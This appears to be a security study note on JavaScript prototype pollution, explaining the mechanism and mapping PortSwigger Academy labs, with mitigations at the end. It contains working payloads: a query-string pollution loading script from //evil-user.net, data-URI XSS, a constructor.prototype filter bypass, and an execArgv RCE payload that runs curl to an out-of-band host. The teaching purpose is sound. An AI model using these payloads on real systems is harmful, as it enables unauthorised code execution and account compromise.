# 01 — Prototype Pollution (Client-Side and Server-Side)

## Mechanism: How JavaScript Inheritance Makes This Possible

Every JavaScript object has an internal link to another object called its **prototype**.
When you access a property on an object, the engine first checks if the object owns that
property directly. If not, it walks up the **prototype chain** and checks the prototype,
then the prototype's prototype, and so on, until it reaches `Object.prototype` — the root
that almost every object in the runtime ultimately inherits from.

`__proto__` is a special accessor property that exposes an object's prototype link. This
is the crux of the vulnerability: `__proto__` is not just a normal string key. When a
recursive merge/clone function processes a key called `__proto__` without filtering it,
the assignment does not create a property called `__proto__` on the target object — it
instead writes through to the target's actual prototype.

Consider this vulnerable pattern, common in "deep merge" / "deep extend" utility
functions used to apply user config or JSON onto a default object:

```js
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);   // <-- recurses without checking key
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
```

Piece by piece:

- `for (let key in source)` — iterates every enumerable key in the attacker-supplied
  object, including `__proto__` if it was created via `JSON.parse()` (more on this below).
- `if (!target[key]) target[key] = {}` — if `target.__proto__` doesn't look "set" in a
  normal way, the function treats it as an empty object to recurse into. But
  `target.__proto__` already resolves to `Object.prototype` via the prototype chain — so
  this step doesn't create a new object, it walks into the **real, global prototype**.
- `merge(target[key], source[key])` — now recursing with `target[key]` bound to
  `Object.prototype` itself. Any further keys assigned here land on the prototype that
  every plain object in the runtime inherits from.

The result: an attacker who controls the shape of `source` (e.g., a JSON request body,
URL parameters, or a `postMessage` payload) can inject `__proto__` as a key and have its
nested properties merged onto `Object.prototype`, polluting every object in the
application globally, not just one request's data.

### Why `JSON.parse()` Specifically Matters

Object literals written directly in source code cannot have an own `__proto__` property —
`{__proto__: {evil: true}}` sets the *prototype* of that literal, it doesn't create an own
key. But `JSON.parse()` treats every key as an arbitrary string, including `__proto__`:

```js
const literal = {__proto__: {evilProperty: 'payload'}};
const fromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');

literal.hasOwnProperty('__proto__');   // false — proto was set via syntax, not a real key
fromJson.hasOwnProperty('__proto__');  // true  — proto here IS a real, own key
```

This is why JSON-based input (request bodies, query strings parsed into objects, web
messages) is the most common real-world pollution source: `JSON.parse()` happily hands a
literal `__proto__` key to whatever merge function processes the result next.

## The Three Components of an Exploit

1. **Source** — user-controllable input that lets you add arbitrary properties to a
   prototype object. Most common: the URL (query string or fragment), JSON request/response
   bodies, and web messages (`postMessage`).
2. **Sink** — a JavaScript function or DOM element that, given the right property value,
   executes code or performs a dangerous action (`eval`, `setTimeout` with a string,
   `script.src` assignment, `child_process.exec`, etc.).
3. **Gadget** — an existing property in the application's own code that is read from an
   object without checking whether it's an "own" property, and whose value flows into a
   sink. The gadget is what turns "I polluted a prototype" into "I executed code."

A property cannot be a gadget if the object already defines it directly — own properties
always take precedence over inherited ones. Hardened applications also sometimes call
`Object.create(null)` to give an object no prototype at all, which defeats this technique
entirely for that object.

---

## Client-Side Prototype Pollution → DOM XSS

### Finding a Source Manually

Try adding an arbitrary property via the query string:

```
https://target.com/?__proto__[foo]=bar
```

Then in DevTools Console: `Object.prototype.foo` — if it returns `"bar"`, you've found a
working pollution source. The application's URL-parsing code is taking your query string,
turning it into a nested object (commonly via libraries like `qs` or hand-rolled parsers),
and merging it without sanitizing the `__proto__` key.

### Finding a Gadget Manually

You then need to read the application's JS source (DevTools → Sources tab) for a pattern
like:

```js
let transport_url = config.transport_url || defaults.transport_url;
let script = document.createElement('script');
script.src = `${transport_url}/example.js`;
document.body.appendChild(script);
```

Piece by piece:

- `config.transport_url || defaults.transport_url` — if `config` does not have its own
  `transport_url`, the lookup falls through the prototype chain. If you've polluted
  `Object.prototype.transport_url`, that polluted value is returned here instead of
  `undefined`, so the `||` never reaches `defaults.transport_url`.
- `document.createElement('script')` / `script.src = ...` — this is the sink. Setting
  `src` on a `<script>` element causes the browser to fetch and execute it as JavaScript.

### The Exploit Payload, Broken Down

```
https://target.com/?__proto__[transport_url]=//evil-user.net
```

- `?__proto__[transport_url]=...` — the pollution source: tells the URL parser to set a
  `transport_url` property on `__proto__`, i.e., on `Object.prototype`.
- `//evil-user.net` — a protocol-relative URL. Once this value flows into `script.src`,
  the browser requests `https://evil-user.net/example.js` (matching the page's own
  protocol) and executes whatever JavaScript that file contains.

A same-request, no-external-host variant uses a `data:` URI to embed the payload directly:

```
https://target.com/?__proto__[transport_url]=data:,alert(1);//
```

- `data:,alert(1);` — a `data:` URL whose content is treated as a JavaScript program when
  loaded into a `<script src="...">` context.
- `//` at the end — comments out whatever the application's own code concatenates after
  the polluted value (in the earlier example, the hardcoded `/example.js` suffix), so the
  full URL still parses as valid, executable JavaScript.

### Bypassing Naive `__proto__` Filtering

Some applications block the literal string `__proto__` but forget that
`constructor.prototype` is an equally valid path to the same object —
`obj.constructor.prototype === Object.prototype` for any plain object. A blocked-key
filter that only checks for `__proto__` is bypassed with:

```json
{"constructor": {"prototype": {"transport_url": "data:,alert(1);//"}}}
```

This walks `constructor` → `prototype` instead of using `__proto__` directly, reaching
the exact same global object through a different property path.

---

## Server-Side Prototype Pollution (Node.js / Express) → Up to RCE

### Why It's Harder to Detect Than the Client-Side Variant

- **No source code access** in a black-box engagement — you can't just read the JS files
  like you can client-side.
- **No visible reflection** — polluted properties usually aren't echoed back in the HTTP
  response the way client-side pollution shows up immediately in DevTools.

### Detection Technique 1: Polluted Property Reflection

If an endpoint takes JSON input and reflects parts of it back (e.g., "update my address,"
then the server responds with the updated user object as JSON), inject:

```json
{"__proto__": {"foo": "bar"}}
```

If a *subsequent, unrelated* request's response also shows the application behaving as if
it has a `foo` property it shouldn't (or, more usefully, an existing property like
`isAdmin` flips to a polluted value), this confirms the prototype was actually polluted
server-side, persisting across requests for the lifetime of the Node.js process.

### Detection Technique 2: Behavior-Based, Non-Destructive Probes

When there's no reflection to observe, pollute a property you know affects observable
server *behavior* rather than response content — these are safer because they don't risk
crashing the application:

- **JSON spaces override** — Express's `res.json()` internally checks an
  `app.get('json spaces')` setting. Polluting `Object.prototype["json spaces"]` with a
  number changes the indentation of every subsequent JSON response from the server, which
  you can observe directly without needing the polluted key to be reflected by name.
- **Status code override** — similarly, polluting an internal status-code-related
  property and watching whether HTTP response codes change confirms write access to the
  global prototype.

Both work because the application reads these properties through the prototype chain
internally (Express's own code does `this.get('json spaces')`-style lookups), so a
successful pollution silently changes framework-level behavior you can observe externally.

### Escalating to Remote Code Execution

The most direct documented technique pollutes Node's `child_process` machinery via the
`execArgv` property, which is read when Node spawns a child process:

```json
{
  "__proto__": {
    "execArgv": ["--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"]
  }
}
```

Piece by piece:

- `"__proto__": { "execArgv": [...] }` — pollutes `Object.prototype.execArgv`. Any code
  in the application that spawns a child process (e.g., `child_process.fork()`) without
  explicitly setting its own `execArgv` will inherit this polluted array.
- `execArgv` is a real Node.js API — an array of extra command-line flags passed to the
  Node.js binary when it spawns a new child process via `fork()`. It's meant for things
  like `--inspect`, not attacker input.
- `--eval=...` — a legitimate Node CLI flag that runs an arbitrary JavaScript string as
  the entire program. Smuggling this into `execArgv` means the next time the application
  spawns a child Node.js process for any reason (e.g., a background maintenance job), that
  child process runs your `--eval` payload instead of (or alongside) its intended script.
- `require('child_process').execSync('curl ...')` — the payload itself: imports Node's
  child_process module again, inside the spawned process, and runs an OS command. The
  `curl` against a Burp Collaborator (or equivalent out-of-band) domain confirms blind RCE
  even with zero response output.

This chain requires the application to actually call `child_process.fork()` somewhere
reachable — typically background job runners, report generators, or "maintenance task"
admin features are the gadget in real applications, which is why privilege escalation via
pollution (reaching admin functionality first) is often a prerequisite step before RCE.

---

## PortSwigger Web Security Academy Lab Mapping

Labs are listed in Academy progression order, split by client-side vs. server-side as the
Academy itself organizes them.

**Client-side prototype pollution:**

1. **Client-side prototype pollution via browser APIs** (Apprentice) — pollution source
   in the query string, gadget reachable via `fetch()`/`Object.defineProperty()`, sink is
   a dynamically created `<script>` tag.
2. **DOM XSS via client-side prototype pollution** (Practitioner) — same root cause, but
   the site has attempted to patch an obvious gadget; requires finding a bypass.
3. **Client-side prototype pollution in third-party libraries** (Practitioner) — the
   pollution source is in the URL fragment (hash) rather than the query string, and the
   gadget lives inside an imported third-party library rather than first-party code.

**Server-side prototype pollution:**

1. **Detecting server-side prototype pollution without polluted property reflection**
   (Practitioner) — practice the JSON-spaces/status-code-style blind detection technique.
2. **Privilege escalation via server-side prototype pollution** (Practitioner) — pollute
   an `isAdmin`-style property to gain access to admin functionality.
3. **Remote code execution via server-side prototype pollution** (Expert) — chain
   privilege escalation into the `execArgv` RCE technique above.

> **Operational note carried over from the Academy itself:** server-side prototype
> pollution testing can break application functionality or crash the target server
> entirely. On the Academy this just means restarting the lab; on a real engagement this
> is a production-availability risk and should be scoped and timed accordingly.

## Real-World Notes

- Prototype pollution gained mainstream industry attention after disclosures affecting
  widely used npm packages (deep-merge/deep-extend style utilities used transitively by
  thousands of projects), meaning a single vulnerable dependency can introduce this class
  into applications that never call the vulnerable merge function directly themselves.
- On bug bounty programs, client-side prototype pollution is frequently reported as a
  CSP-bypass primitive rather than as a standalone bug — its real value shows up when
  chained with file `02` (DOM Clobbering) or with an existing HTML injection that a strict
  CSP would otherwise block.
- Server-side prototype pollution is Node.js/Express-specific in the way this file covers
  it; the same conceptual class exists in other prototype-based or dynamically-typed
  ecosystems, but black-box detection techniques and gadgets differ by runtime.
- Industry-standard mitigation: use `Object.create(null)` for objects meant to hold
  user-controlled keys, use `Map` instead of plain objects for key-value user data (Maps
  don't have a prototype-pollutable `__proto__` getter in the same way), and `Object.freeze(Object.prototype)`
  defensively where the application's threat model allows it.
